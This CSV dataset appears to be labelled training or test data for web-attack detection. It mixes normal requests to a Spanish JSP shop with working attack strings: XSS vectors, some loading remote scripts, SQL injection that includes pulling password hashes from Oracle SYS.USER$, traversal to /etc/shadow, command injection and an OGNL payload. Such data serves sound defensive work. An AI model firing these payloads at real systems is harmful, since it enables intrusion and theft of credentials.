payload,type
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\..\..\..\{FILE},traversal
miembros/index.jsp,normal
"s.os: select * from users where id=1 or "".%"" or 1=1 -- 1",sqli
&lt;SCRIPT SRC=http://ha.ckers.org/xss.js,xss
%2e%2e\%2e%2e\%2e%2e\{FILE},traversal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>,xss
&#60;BODY BACKGROUND&#61;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;,xss
miembros/imagenes/ogono.jpg,normal
global/estilos.css,normal
global/menum.jsp,normal
"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",xss
imagenes/cmenbul.gif,normal
"<body onpagehide body onpagehide=""javascript:javascript:alert(1)""></body onpagehide>",xss
"s).s: select * from users where id=1 or "").""=1 or 1=1 -- 1",sqli
global/creditos.jsp,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
<img/src=@&#32;&#13; onerror = prompt('&#49;'),xss
imagenes/logo.gif,normal
<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>,xss
..%252f..%252f..%252f..%252f{FILE},traversal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
"<STYLE TYPE=""text/javascript"">alert('XSS');</STYLE>",xss
"""<IMG%20SRC=""""jav",xss
&lt;IMG SRC=javascript&#058;alert(&quot;XSS&quot;)&gt;,xss
"ascript:alert('WXSS');"""">""",xss
....\....\....\{FILE},traversal
/../../../../../../../../../../etc/shadow,traversal
"""<IMG SRC=""""javascript:alert('XSS');"""">""",xss
<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1),xss
0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f{FILE},traversal
"xss&#58;ex&#x2F;*XSS*//*/*/pression(alert(\""XSS\""))'&gt;",xss
&lt;DIV STYLE=&quot;background-image: url(javascript:alert(&apos;XSS&apos;))&quot;&gt;,xss
publico/miembros.jsp,normal
publico/pagar.jsp?modo=insertar&precio=4557&B1=Confirmar,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
imagenes/2.gif,normal
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},traversal
miembros/fotos.jsp,normal
&lt;OBJECT classid=clsid&#58;ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript&#058;alert('XSS')&gt;&lt;/OBJECT&gt;,xss
index.jsp,normal
&#X3c;,xss
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=7)) AND 'i'='i",sqli
imagenes/1.gif,normal
publico/registro.jsp?modo=registro&login=meara&password=anest1sica&nombre=Jugen&apellidos=Cabot+Camaran&email=baigent%40blueberryminiloaf.com.dj&dni=69409914P&direccion=Castelo+Branco%2C+63%2C+&ciudad=Villalba+de+la+Loma&cp=37329&provincia=Baleares+%28Illes%29&ntc=2796348455963884&B1=Registrar,normal
"""<A HREF=""""http://google.com/"""">XSS</A>""",xss
miembros/editar.jsp?modo=registro&login=overton&password=ceRveCeR%EDA&nombre=Cosme&apellidos=Viladomat+Gasull&email=shiomi%40errebebe.ug&dni=70489976J&direccion=Calle+Muelles%2C+70%2C+6G&ciudad=Vilob%ED+del+Pened%E8s&cp=45908&provincia=Toledo&ntc=4750834665833814&B1=Registrar,normal
imagenes/nuestratierra.jpg,normal
publico/autenticar.jsp?modo=entrar&login=shing-mi&pwd=d9s1a1i89&remember=on&B1=Entrar,normal
veris-->group<svg/onload=alert(/XSS/)//,xss
publico/productos.jsp,normal
imagenes/cmenbul.gif,normal
miembros/imagenes/zarauz.jpg,normal
imagenes/cmenbul.gif,normal
%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63{FILE},traversal
miembros/fotos.jsp,normal
) union select * from information_schema.tables;,sqli
"<;IFRAME SRC="";javascript:alert(';XSS';);"";>;<;/IFRAME>;",xss
miembros/index.jsp,normal
miembros/editar.jsp?modo=registro&login=trevetha&password=.32l6152v0%F1o&nombre=Leonella&apellidos=Sintes+Gasd%E9&email=janisch4%40ebaz.museum&dni=34336341D&direccion=Escritor+Miguel+Delibes+0%2C+7%3FB&ciudad=Cantalejo&cp=33825&provincia=Lleida&ntc=6358756406474802&B1=Registrar,normal
<IMG SRC=JaVaScRiPt:alert('XSS')>,xss
publico/productos.jsp,normal
"`""'><img src='#\x27 onerror=javascript:alert(1)>",xss
"<IMG DYNSRC=""javascript:alert('XSS')"">",xss
"""&<script>document.write(""""XSS-XSS-XSS"""");</script>""",xss
|id,command_injection
publico/productos.jsp,normal
miembros/index.jsp,normal
global/estilos.css,normal
"&lt;DIV STYLE=\""background-image&#58; url(javascript&#058;alert('XSS'))\""&gt;",xss
"<a href=""\xE2\x81\x9Fjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
publico/caracteristicas.jsp?id=1,normal
"<IMG SRC=x onmousedown=""alert(String.fromCharCode(88,83,83))"">",xss
"<a href=""\x1Bjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""javascript\x3A:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=39&cantidad=70&B1=A%F1adir+al+carrito,normal
/..\../..\../..\../..\../..\../..\../boot.ini,traversal
global/menum.jsp,normal
"<script\x20type=""text/javascript"">javascript:alert(1);</script>",xss
publico/pagar.jsp?modo=insertar&precio=1976&B1=Confirmar,normal
global/estilos.css,normal
publico/caracteristicas.jsp?id=1,normal
"&(.)o: select * from users where id=1 or (\.)=1 union select 1,@@VERSION -- 1",sqli
"1)UE1: select * from users where id=1 +(1) union select 1,banner from v$version where rownum=1 -- 1",sqli
"<embed src=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"">",xss
"'XOR(if(now()=sysdate(),sleep(5*5*0),0))OR'",sqli
global/creditos.jsp,normal
miembros/imagenes/castro.jpg,normal
"""<img src=&{document.write(""""XSS-XSS-XSS"""");};>""",xss
publico/vaciar.jsp?B2=Vaciar+carrito,normal
grant connect to name; grant resource to name;,sqli
publico/pagar.jsp?modo=insertar&precio=7537&B1=Confirmar,normal
miembros/editar.jsp?modo=registro&login=crampton4&password=Endoblar&nombre=Jan&apellidos=Eberl%E9&email=eclar%40magadan.org.edu&dni=86090489V&direccion=Avda.+Pio+Xii%2C+48+&ciudad=Aguilar+de+la+Frontera&cp=50830&provincia=Castell%F3n&ntc=7548017062827268&B1=Registrar,normal
imagenes/1.gif,normal
imagenes/2.gif,normal
..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66{FILE},traversal
",@variable",sqli
"""`'><script>\xE2\x80\x8Bjavascript:alert(1)</script>",xss
imagenes/logo.gif,normal
imagenes/3.gif,normal
miembros/index.jsp,normal
index.jsp,normal
"<script\x20type=""text/javascript"">javascript:alert(1);</script>",xss
publico/autenticar.jsp?modo=entrar&login=core&pwd=457l0%EDm3t46&remember=on&B1=Entrar,normal
..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f{FILE},traversal
%2e%2e\{FILE},traversal
"(1?(1?{a:1?""""[1?""ev\a\l"":0](1?""\a\lert"":0):0}:0).a:0)[1?""\c\a\l\l"":0](content,1?""x\s\s"":0)",xss
global/estilos.css,normal
"<P STYLE=""behavior:url('#default#time2')"" end=""0"" onEnd=""javascript:alert(1)"">",xss
miembros/imagenes/ogono.jpg,normal
imagenes/cmenbul.gif,normal
"ABC<div style=""x:\x0Dexpression(javascript:alert(1)"">DEF",xss
%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\%uff0e%uff0e\{FILE},traversal
imagenes/3.gif,normal
"""/><img/onerror=\x0Cjavascript:alert(1)\x0Csrc=xxx:x />",xss
miembros/index.jsp,normal
publico/registro.jsp?modo=registro&login=beom-sah&password=escarpelo&nombre=Jes%FAs&apellidos=Bolado+Pellicer&email=paragon.calithness%40callalelaboca.be&dni=82402810C&direccion=Calle+Manuel+De+Falla%2C+65+5%3FA&ciudad=Mont%E1n&cp=14640&provincia=Zaragoza&ntc=6273470389160924&B1=Registrar,normal
global/titulo.jsp,normal
imagenes/nuestratierra.jpg,normal
publico/productos.jsp,normal
"ABC<div style=""x:\xE2\x80\x84expression(javascript:alert(1)"">DEF",xss
declare @s varchar (8000) select @s = 0x73656c65637420404076657273696f6e,sqli
publico/caracteristicas.jsp?id=1,normal
"';alert(String&#46;fromCharCode(88,83,83))//\';alert(String&#46;fromCharCode(88,83,83))//\"";alert(String&#46;fromCharCode(88,83,83))//\\"";alert(String&#46;fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;\""&gt;'&gt;&lt;SCRIPT&gt;alert(String&#46;fromCharCode(88,83,83))&lt;/SCRIPT&gt;",xss
publico/pagar.jsp?modo=insertar&precio=5734&B1=Pasar+por+caja,normal
miembros/imagenes/ogono.jpg,normal
miembros/salir.jsp,normal
..%255c..%255c{FILE},traversal
global/creditos.jsp,normal
global/creditos.jsp,normal
miembros/imagenes/zarauz.jpg,normal
"s.v: select * from users where id=1 or "".@"" or 1=1 -- 1",sqli
vbscript:Execute(MsgBox(chr(88)&chr(83)&chr(83)))<,xss
or 1=1-- ,sqli
publico/vaciar.jsp?B2=Vaciar+carrito,normal
publico/registro.jsp?modo=registro&login=franka&password=V5482%2BCT0&nombre=Hossana&apellidos=Decour+Raichs&email=cou%40tradedeficit.pg&dni=81451206H&direccion=Calle+Joan+Salvat+Papasseit+S%2FN%2C+&ciudad=Cella&cp=50408&provincia=Badajoz&ntc=5349288055787524&B1=Registrar,normal
miembros/imagenes/castro.jpg,normal
"""`'><script>\xEF\xBF\xBEjavascript:alert(1)</script>",xss
publico/vaciar.jsp?B2=Vaciar+carrito,normal
<iframe// src=javaSCRIPT&colon;alert(1),xss
&lt;HTML&gt;&lt;BODY&gt;,xss
imagenes/cmenbul.gif,normal
imagenes/cmenbul.gif,normal
publico/miembros.jsp,normal
index.jsp,normal
imagenes/logo.gif,normal
publico/miembros.jsp,normal
"<a href=""\x07javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c{FILE},traversal
imagenes/1.gif,normal
"&#60;META HTTP-EQUIV&#61;&#34;refresh&#34; CONTENT&#61;&#34;0&#59;url&#61;data&#58;text&#47;html&#59;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&#34;&#62;",xss
publico/registro.jsp?modo=registro&login=kaefer&password=cOrreNT%CDA&nombre=Yahed&apellidos=Moux+Claver&email=bradshaw.ocallaghan%40almascanarias.do&dni=05208723M&direccion=Calle+Puerta+Del+Sol%2C+88%2C+&ciudad=Villamanrique+de+la+Condesa&cp=47800&provincia=Valencia&ntc=6196716655513010&B1=Registrar,normal
publico/miembros.jsp,normal
global/menum.jsp,normal
miembros/salir.jsp,normal
"<IMG SRC=""javascript:alert('XSS');"">",xss
..%c0%af{FILE},traversal
imagenes/nuestratierra.jpg,normal
publico/carrito.jsp,normal
publico/carrito.jsp,normal
"sUE\c: select * from users where id='1' union select \#,@@VERSION -- 1'",sqli
"<IMG DYNSRC=""javascript:alert('XSS')"">",xss
1;a=eval;b=alert;a(b(/c/.source));,xss
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,traversal
global/titulo.jsp,normal
<img src=`xx:xx`onerror=alert(1)>,xss
%c0%ae%c0%ae\%c0%ae%c0%ae\{FILE},traversal
<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+,xss
global/estilos.css,normal
<IMG SRC=”jav ascript:alert(‘XSS’);”>,xss
"<IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>"">",xss
miembros/editar.jsp?modo=registro&login=tropeano3&password=86a7o&nombre=Alimena&apellidos=Santidrian+Rexach&email=musson%40ajuntamentdebarcelona20.pr&dni=12186635Q&direccion=Castilla+S%2FN+&ciudad=Legarda&cp=33875&provincia=Toledo&ntc=5536600969659944&B1=Registrar,normal
publico/carrito.jsp,normal
miembros/imagenes/zarauz.jpg,normal
global/menum.jsp,normal
miembros/editar.jsp?modo=registro&login=raul&password=8a92rique46&nombre=Wido&apellidos=Romero+Pereyra&email=macdougall_laurier%40rocofer.am&dni=34481916V&direccion=C%2F+San+Francisco%2C+45+&ciudad=Casasola+de+Ari%F3n&cp=34259&provincia=Madrid&ntc=0592934033194730&B1=Registrar,normal
"s)n: select * from users where id=1 or "")["" or 1=1 -- 1",sqli
<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>,xss
"ABC<div style=""x\x3Aexpression(javascript:alert(1)"">DEF",xss
publico/productos.jsp,normal
publico/carrito.jsp,normal
miembros/index.jsp,normal
imagenes/logo.gif,normal
&on&1: select * from users where id=1 or \<$ or 1=1 -- 1,sqli
"<script>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://www.securitycompass.com/xss.js""></script>",xss
global/creditos.jsp,normal
"<IMG SRC=javascript:alert(""XSS"")>",xss
imagenes/3.gif,normal
""">/XaDoS/><script>alert(document.cookie)</script>",xss
publico/productos.jsp,normal
imagenes/1.gif,normal
publico/caracteristicas.jsp?id=2,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
miembros/imagenes/zarauz.jpg,normal
miembros/editar.jsp?modo=registro&login=prewitt&password=ma2o4esa&nombre=Aricel&apellidos=Romaguer&email=mirel-duvitski%40pavimentosalagon.sr&dni=38449362D&direccion=Alcalde+Isidoro+Enciso%2C+100+6%3FG&ciudad=Tolox&cp=28850&provincia=C%E1diz&ntc=5111638071636143&B1=Registrar,normal
miembros/salir.jsp,normal
imagenes/nuestratierra.jpg,normal
publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=85&cantidad=14&B1=A%F1adir+al+carrito,normal
publico/autenticar.jsp?modo=entrar&login=charlie&pwd=b82r8l23o&remember=on&B1=Entrar,normal
global/titulo.jsp,normal
"&lt;META HTTP-EQUIV=\""refresh\"" CONTENT=\""0;url=data&#58;text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\""&gt;",xss
<img src ?itworksonchrome?\/onerror = alert(1),xss
miembros/imagenes/zarauz.jpg,normal
%25c0%25ae%25c0%25ae\{FILE},traversal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
global/titulo.jsp,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
<frameset onload=javascript:alert(1)>,xss
/../../../../../../../../../../etc/shadow^^,traversal
"<html onMouseUp html onMouseUp=""javascript:javascript:alert(1)""></html onMouseUp>",xss
miembros/imagenes/ogono.jpg,normal
miembros/salir.jsp,normal
<script\x0D>javascript:alert(1)</script>,xss
index.jsp,normal
"<body onkeydown body onkeydown=""javascript:javascript:alert(1)""></body onkeydown>",xss
publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=39&cantidad=90&B1=A%F1adir+al+carrito,normal
"<a href=""\x10javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
imagenes/cmenbul.gif,normal
<script>alert(1);</script>,xss
26%,sqli
"<img src=""http://www.w3schools.com/tags/planets.gif"" width=""145"" height=""126"" alt=""Planets"" usemap=""#planetmap""><map name=""planetmap""><area shape=""rect"" coords=""0,0,145,126"" a-="">"" href=""j&#x61;vascript:&#x61;lert(-1)""></map>",xss
..........................................................................\..\..\..\..\..\..\..\{FILE},traversal
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../{FILE},traversal
..\..\{FILE},traversal
imagenes/cmenbul.gif,normal
"<a href=""javas\x05cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
&lt;SCRIPT SRC=//ha.ckers.org/.j&gt;,xss
miembros/fotos.jsp,normal
miembros/editar.jsp?modo=registro&login=calleja&password=9u5es2v83ent2&nombre=Tila&apellidos=Acurio+Bayona&email=wessell.georg%40smalltec.md&dni=83360974G&direccion=Calle+La+Rambla+S%2FN+4%3FD&ciudad=Taravilla&cp=44143&provincia=A+Coru%F1a&ntc=9019896710304929&B1=Registrar,normal
"<IMG SRC=x ondblclick=""alert(String.fromCharCode(88,83,83))"">",xss
global/titulo.jsp,normal
"<embed src=""data:text/html;base64,%(base64)s"">",xss
publico/registro.jsp?modo=registro&login=tarik&password=sobrecogimiento&nombre=Crisp%EDn&apellidos=Pardinas+Odrem%E1n&email=mcrae-broccolino%40lodgemadrid.pk&dni=85009456F&direccion=Agullana+65%2C+13%3FC&ciudad=Arrigorriaga&cp=23215&provincia=Valencia&ntc=6735120174672255&B1=Registrar,normal
..%252f..%252f..%252f{FILE},traversal
') or ('a'='a,sqli
miembros/salir.jsp,normal
publico/autenticar.jsp?modo=entrar&login=de_souza&pwd=3nmo08v16a&remember=off&B1=Entrar,normal
<IMG%20SRC='%26%23x6a;avasc%26%23000010ript:a%26%23x6c;ert(document.%26%23x63;ookie)'>,xss
publico/productos.jsp,normal
imagenes/nuestratierra.jpg,normal
"<a href=""javas\x05cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
imagenes/nuestratierra.jpg,normal
"<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script ????????????",xss
"<FRAMESET><FRAME SRC=""javascript:javascript:alert(1);""></FRAMESET>",xss
imagenes/cmenbul.gif,normal
imagenes/nuestratierra.jpg,normal
 or isNULL(1/0) /*,sqli
imagenes/3.gif,normal
..%255c{FILE},traversal
index.jsp,normal
"<applet onerror applet onerror=""javascript:javascript:alert(1)""></applet onerror>",xss
"<SCRIPT SRC=""http://ha.ckers.org/xss.jpg""></SCRIPT>",xss
"<embed src=""javascript:alert(1)"">",xss
..%c0%5c..%c0%5c{FILE},traversal
"<a href=""\xE2\x80\xAFjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
publico/carrito.jsp,normal
..%c0%5c..%c0%5c..%c0%5c..%c0%5c{FILE},traversal
"&(1)o: select * from users where id=1 or (1)=1 union select 1,banner from v$version where rownum=1 -- 1",sqli
"${%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(%22web%22),%23resp.getWriter().print(%22path:%22),%23resp.getWriter().print(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23resp.getWriter().flush(),%23resp.getWriter().close()}",code_injection
"<img src=""javascript:document.vulnerable=true;"">",xss
"<table><TD BACKGROUND=""javascript:document.vulnerable=true;"">",xss
a);/usr/bin/id|,command_injection
imagenes/3.gif,normal
&#X0003c;,xss
publico/vaciar.jsp?B2=Vaciar+carrito,normal
miembros/imagenes/zarauz.jpg,normal
././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../{FILE},traversal
publico/anadir.jsp?id=2&nombre=Vino+Rioja&precio=39&cantidad=66&B1=A%F1adir+al+carrito,normal
%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},traversal
"<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:javascript:alert(1);"">",xss
publico/vaciar.jsp?B2=Vaciar+carrito,normal
miembros/fotos.jsp,normal
miembros/editar.jsp?modo=registro&login=baril&password=holgorio&nombre=Mabby&apellidos=Boniquet+Jeria&email=neel%40deseoun.aq&dni=60210107V&direccion=C%2F+Zumalacarregui+87%2C+&ciudad=Portillo&cp=13420&provincia=M%E1laga&ntc=8715715387496940&B1=Registrar,normal
miembros/fotos.jsp,normal
%c0%2e%c0%2e\{FILE},traversal
publico/registro.jsp?modo=registro&login=barron&password=0h5RrAd0&nombre=Norelia&apellidos=Isart+Schwarzenberg&email=roseman-hensley%40fighting-machines.wf&dni=17923027R&direccion=C%2F+Santisimo+Cristo+Del+Amor%2C+186%2C+&ciudad=Sant+Esteve+de+la+Sarga&cp=41420&provincia=Segovia&ntc=5889772581195146&B1=Registrar,normal
publico/pagar.jsp?modo=insertar&precio=6246&B1=Confirmar,normal
%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\{FILE},traversal
\n/bin/ls -al\n,command_injection
a|/usr/bin/id,command_injection
<script x> alert(1) </script 1=2,xss
miembros/imagenes/zarauz.jpg,normal
"<IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>"">",xss
publico/miembros.jsp,normal
miembros/salir.jsp,normal
">""><script>alert(""XSS"")</script>&",xss
global/creditos.jsp,normal
&#39;&#88;&#83;&#83;&#39;&#41;>,xss
publico/productos.jsp,normal
"&lt;XSS STYLE=\""behavior&#58; url(xss&#46;htc);\""&gt;",xss
<script itworksinallbrowsers>/*<script* */alert(1)</script ?,xss
"<comment><img src=""</comment><img src=x onerror=javascript:alert(1))//"">",xss
miembros/imagenes/zarauz.jpg,normal
"<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>   ",xss
"ooUE1: select * from users where id=1<@<@ union select 1,version() -- 1",sqli
<script>%(payload)s</script>,xss
miembros/editar.jsp?modo=registro&login=hoyer&password=poli8%E1l2a&nombre=Gema&apellidos=Magriny%E0&email=delaune%40tintasultravioleta.io&dni=08806627L&direccion=Av.+De+La+Reina+Sofia+151+&ciudad=Poboleda&cp=43700&provincia=Guadalajara&ntc=3288111380573813&B1=Registrar,normal
publico/pagar.jsp?modo=insertar&precio=3808&B1=Pasar+por+caja,normal
..%5c..%5c..%5c{FILE},traversal
xyz onerror=alert(6);,xss
"&noo1: select * from users where id=1 or $+<1 union select 1,@@VERSION -- 1",sqli
publico/caracteristicas.jsp?id=1,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
publico/registro.jsp?modo=registro&login=servidio&password=m9ncilla57&nombre=Maciela&apellidos=Mediavilla+Buera&email=bryson2%40casablancabeach.kp&dni=46208410F&direccion=Calle+Pintor+El+Greco+102+1-G&ciudad=Villasequilla&cp=45840&provincia=Burgos&ntc=0049063230467813&B1=Registrar,normal
publico/productos.jsp,normal
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=1)) AND 'i'='i",sqli
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
